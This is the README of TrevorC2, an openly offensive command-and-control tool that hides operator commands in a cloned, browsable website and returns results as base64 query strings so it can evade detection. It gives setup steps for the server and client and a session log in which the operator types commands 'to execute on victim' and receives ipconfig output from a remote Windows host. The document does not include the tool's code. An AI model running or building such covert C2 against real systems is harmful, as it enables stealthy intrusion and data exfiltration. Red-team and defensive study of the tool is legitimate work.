trevorc2
=======

# TrevorC2 - Command and Control via Legitimate Behavior over HTTP

Written by: Dave Kennedy (@HackingDave)
Website: https://www.trustedsec.com

Note that this is a very early release - heavy randomization and encryption to be added soon.

TrevorC2 is a client/server model for masking command and control through a normally browsable website. Detection becomes much harder as time intervals are different and does not use POST requests for data exfil. 


           ,  .'''''.  ...    ''''',  .'           
            ','     ,.MMMM;.;'      '.             
             ;;    ;MMMMMMMMM;     ;;'             
            :'M:  ;MMMMMMMMMMM;.  :M':             
            : M:  MMMMMMMMMMMMM:  :M  .           
           .' M:  MMMMMMMMMMMMM:  :M. ;           
           ; :M'  :MMMMMMMMMMMM'  'M: :           
           : :M: .;"MMMMMMMMM":;. ,M: :           
           :  ::,MMM;.M":::M.;MMM ::' :           
         ,.;    ;MMMMMM;:MMMMMMMM:    :,.         
         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM         
         M':''':MMMMMMMMM;MMMMMMMM: "': M         
         M.:   ;MMMMMMMMMMMMMMMMMM;   : M         
         :::   MMMMMMMMMMM;MMMMMMMM   ::M         
        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".         
      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.       
     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '     
     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.     
     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:     
     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:     
      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM       
      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:       
       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM       
       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:       
        :M: :    MMMMMMMMM'MMMMMM'   : :MM'       
        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"         
         'M  :    ""''':;;;'''""    :  M:         
         ;'  :     "MMMMMMMM;."     :  "".         
       ,;    :      :MMMMMMM:;.     :    '.       
      :'     :    ,MM'''""''':M:    :     ';       
     ;'      :    ;M'         MM.   :       ;.     

There are two components to TrevorC2 - the client and the server. The client can be configured to be used with anything. In this example it's coded in Python but can easily be ported to C#, PowerShell, or whatever you want. Currently the trevorc2_client.py supports Windows, MacOS, and Linux. You can always byte compile the Windows one to get an executable, but preference would be to use Windows without having to drop an executable as a stager.

The way that the server works is by tucking away a parameter thats right before the </body> parameter. This is completely configurable, and it's recommended you configure everything to be unique in order to evade detection. Here is the workflow:

    1. trevor2_server.py - edit the file first, and customize, what website you want to clone, etc. The server will clone a website of your choosing and stand up a server. This server is browsable by anyone and looks like a legitimate website. Contained within the source is parameter that (again is configurable), which contains the instructions for the client. Once a client connects, it searches for that parameter, then uses it to execute commands.
    2. trevor2_client.py - all you need in any configurable option is the ability to call out to a website, parse some basic data, and then execute a command and then put the results in a base64 encoded query string parameter to the site. That's it, not hard. 

## Installation

pip install -r requirements.txt

## Usage

First edit the trevor2_server.py - change the configuration options and site to clone.

python trevor2_server.py

Next, edit the trevor2_client.py - change the configuration and system you want it to communicate back to. 

python trevor2_client.py

## Session Management

TrevorC2 supports the ability to handle multiple shells coming from different hostnames. The way TrevorC2 works is it will identify new hostnames as sessions. You can interact with the sessions once you execute a command. If you have multiple sessions, you can type a command and interact with that session based on the session number stored globally. Example below:

```

root@stronghold:/home/relik/Desktop/git/trevorc2# python trevorc2_server.py 

TrevorC2 - Legitimate Website Covert Channel
Written by: David Kennedy (@HackingDave)
https://www.trustedsec.com
[*] Cloning website: https://www.google.com
[*] Site cloned successfully.
[*] Starting Trevor C2 Server...
[*] Next, enter the command you want the victim to execute.
[*] Client uses random intervals, this may take a few.
Enter the command to execute on victim: 
*** Received connection from 172.16.37.133 and hostname DESKTOP-3VDNDSJ for TrevorC2.

*** Received connection from 127.0.0.1 and hostname stronghold for TrevorC2.

Enter the command to execute on victim: ipconfig
*** Select which assets to interact with to execute the command ***

1. DESKTOP-3VDNDSJ:172.16.37.133 (TrevorC2 Established)
2. stronghold:127.0.0.1 (TrevorC2 Established)


Enter the session number to interact with: 1
[*] Waiting for command to be executed, be patient, results will be displayed here...
[*] Received response back from client...
=-=-=-=-=-=-=-=-=-=-=
(HOSTNAME: DESKTOP-3VDNDSJ
CLIENT: 172.16.37.133)

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::8984:c775:d798:3b88%4
   IPv4 Address. . . . . . . . . . . : 172.16.37.133
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.37.2

Ethernet adapter Bluetooth Network Connection:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Teredo Tunneling Pseudo-Interface:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:6ab8:8aa:24a3:53ef:da7a
   Link-local IPv6 Address . . . . . : fe80::8aa:24a3:53ef:da7a%6
   Default Gateway . . . . . . . . . : ::

Enter the command to execute on victim:
```
## TODO

#### Add ability for longer than 2048 data output. Query string parameter length limited size length.
#### Add do_POST support for POST exfil on longer data.
#### Add upload/download functionality.
